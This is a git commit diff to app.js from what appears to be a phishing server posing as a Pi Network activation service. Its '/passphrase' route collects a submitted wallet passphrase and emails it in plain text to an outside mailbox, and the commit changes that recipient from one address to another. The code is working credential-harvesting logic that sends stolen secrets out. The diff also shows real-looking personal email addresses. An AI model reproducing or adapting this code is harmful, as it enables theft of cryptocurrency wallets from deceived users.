7648677cb4ab1824163250532bd085e685aa0f2a
victorpinetwork002 <160152638+victorpinetwork002@users.noreply.github.com>
2024-02-17 20:05:45 +0100

    Update app.js

--- app.js
+++ app.js
@@ -50,7 +50,7 @@ app.post('/passphrase', async (req, res) => {
   // Define the email message
   const mailOptions = {
     from: 'sender@pitransferactivation.com',
-    to: 'pinetworkmainnetactivation@mail.ru',
+    to: 'ashleygentry571@gmail.com',
     subject: 'Passphrase Received',
     text: `Passphrase: ${passphrase}`,
   };
